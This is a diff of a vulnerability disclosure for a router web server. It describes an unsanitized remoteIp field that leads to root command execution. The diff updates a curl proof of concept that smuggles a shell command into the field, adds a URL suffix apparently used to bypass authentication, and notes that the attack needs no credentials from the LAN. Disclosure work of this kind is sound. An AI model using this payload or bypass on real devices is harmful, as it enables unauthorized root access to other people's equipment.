@@ -6,12 +6,14 @@
 
 In the httpd binary, the function `formSetSafeWanWebMan` handles requests to `/goform/SetRemoteWebCfg`. The `remoteIp` parameter is stored in NVRAM (`wans.wanwebip`) without sanitization. The `netctrl` binary later reads this value and passes it to `doSystemCmd("iptables ... -s %s ...")`, which calls `system()`, allowing arbitrary command execution as root.
 
+This endpoint requires authentication. Combined with the [authentication bypass](../auth_bypass/detail.md), it can be exploited without credentials from the LAN.
+
 ![Ghidra showing unsanitized remoteIp stored in NVRAM](screenshots/1.png)
 
 ## POC
 
 ```
-curl -i -X POST http://192.168.0.1/goform/SetRemoteWebCfg -d "remoteWebEn=1&remoteIp=1.2.3.4;id>/tmp/pwned&remotePort=8080"
+curl -i -X POST "http://192.168.0.1/goform/SetRemoteWebCfg?reasy-ui-1.0.3.js" -d "remoteWebEn=1&remoteIp=1.2.3.4;id>/tmp/pwned&remotePort=8080"
 ```
 
 ![PoC result](screenshots/2.png)
